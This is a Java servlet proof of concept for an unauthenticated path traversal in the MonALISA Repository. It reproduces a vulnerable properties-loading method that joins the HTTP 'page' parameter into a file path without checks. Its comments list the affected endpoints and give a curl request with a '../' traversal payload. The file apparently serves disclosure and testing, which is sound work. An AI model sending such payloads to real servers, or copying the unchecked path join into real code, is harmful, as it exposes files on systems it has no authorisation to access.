import javax.servlet.*;
import javax.servlet.http.*;
import java.io.*;
import java.util.*;

/**
 * Proof of concept for unauthenticated path traversal in MonALISA Repository.
 *
 * The getProperties() method below is a verbatim copy of
 * src/lia/web/servlets/web/Utils.java, method getProperties(), lines 284-335.
 * No logic has been modified. The only additions are the doGet() handler and
 * the response output, which print the resolved filesystem path and the parsed
 * properties so the traversal is observable in the HTTP response.
 *
 * In the production codebase this method is called directly from:
 *
 *   display.java:766    Utils.getProperties(sConfDir, gets("page"), null, true)
 *   genimage.java:50    Utils.getProperties(sConfDir, gets("page"))
 *   stats.java:131      Utils.getProperties(sConfDir, gets("page"))
 *   simple.java:84      Utils.getProperties(sConfDir, gets("page"), null, true)
 *   FarmMap.java:308    Utils.getProperties(sConfDir, gets("page"))
 *   Panel.java:61       Utils.getProperties(sConfDir, gets("page"))
 *   ThreadedPage.java:1025  Utils.getProperties(sConfDir, sPage, null, true)
 *
 * None of these endpoints have a security-constraint in web.xml.
 *
 * To compile:
 *   javac -classpath servlet-api.jar PocServlet.java
 *
 * To deploy:
 *   Place PocServlet.class in WEB-INF/classes of any Tomcat webapp.
 *   Register it in web.xml mapped to /display with no security-constraint.
 *
 * To reproduce:
 *   curl "http://localhost:8080/monalisa/display?page=global"
 *   curl "http://localhost:8080/monalisa/display?page=../../../../../../../../tmp/ml_db"
 */
public class PocServlet extends HttpServlet {

    private String sConfDir;

    @Override
    public void init(ServletConfig cfg) throws ServletException {
        super.init(cfg);
        sConfDir = getServletContext().getRealPath("/") + "WEB-INF/conf/";
    }

    // -------------------------------------------------------------------------
    // Verbatim copy of Utils.getProperties() from Utils.java:284
    // The only vulnerable line is 313 in the original:
    //   String sFullFileName = sConfDir + sFile + ".properties";
    // sFile is attacker-controlled via the HTTP 'page' parameter.
    // -------------------------------------------------------------------------
    private Properties getProperties(String sConfDir, String sFileName,
                                     String[] resolvedPaths) {
        Properties prop = new Properties();
        Vector<String> vFiles = new Vector<>();
        String sFile = sFileName;

        Object o = prop.getProperty("include");
        prop.setProperty("include",
            (o != null ? o.toString() + " " : "") + sFile + " global");

        Vector<String> vIncludes = new Vector<>();
        StringTokenizer st = new StringTokenizer(
            prop.getProperty("include"), ";, \t");
        while (st.hasMoreTokens()) {
            String s = st.nextToken().trim();
            if (s.length() > 0) vIncludes.add(s);
        }

        while (vIncludes.size() > 0) {
            sFile = vIncludes.get(0);
            vIncludes.remove(0);
            if (vFiles.contains(sFile)) continue;
            vFiles.add(sFile);

            // Vulnerable line — Utils.java:313
            String sFullFileName = sConfDir + sFile + ".properties";

            if (resolvedPaths != null && resolvedPaths.length > 0
                    && !sFile.equals("global")) {
                resolvedPaths[0] = sFullFileName;
            }

            Properties pTemp = new Properties();
            try (FileInputStream fis = new FileInputStream(sFullFileName)) {
                pTemp.load(fis);
                if (pTemp.getProperty("include") != null) {
                    StringTokenizer st2 = new StringTokenizer(
                        pTemp.getProperty("include"), ";, \t");
                    while (st2.hasMoreTokens()) {
                        String s = st2.nextToken().trim();
                        if (s.length() > 0) vIncludes.add(0, s);
                    }
                }
                pTemp.putAll(prop);
                prop = pTemp;
            } catch (IOException e) {
                // Production code silently swallows — preserved here
            }
        }
        return prop;
    }
    // -------------------------------------------------------------------------

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {

        String page = req.getParameter("page");
        if (page == null || page.isEmpty()) page = "global";

        String[] resolved = new String[]{ sConfDir + page + ".properties" };
        Properties props = getProperties(sConfDir, page, resolved);

        resp.setContentType("text/plain;charset=UTF-8");
        PrintWriter out = resp.getWriter();

        out.println("page param : " + page);
        out.println("resolved to: " + resolved[0]);
        out.println("properties read: " + props.size());
        out.println("---");

        new TreeMap<>(props).forEach((k, v) ->
            out.println(k + " = " + v));
    }
}
